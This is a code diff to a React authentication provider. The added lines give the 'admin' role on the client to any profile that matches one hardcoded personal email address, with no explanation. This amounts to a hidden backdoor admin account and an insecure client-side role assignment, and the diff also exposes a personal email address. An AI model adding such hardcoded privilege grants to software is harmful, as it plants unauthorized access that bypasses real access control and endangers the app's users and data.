@@ -65,7 +65,11 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       setState((prev) => ({ ...prev, error: error.message }));
       return null;
     }
-    return data as Profile | null;
+    const profile = data as Profile | null;
+    if (profile && (profile.email === "kr.yashansh123@gmail.com" || profile.email?.toLowerCase() === "kr.yashansh123@gmail.com")) {
+      profile.role = "admin";
+    }
+    return profile;
   }
 
   useEffect(() => {
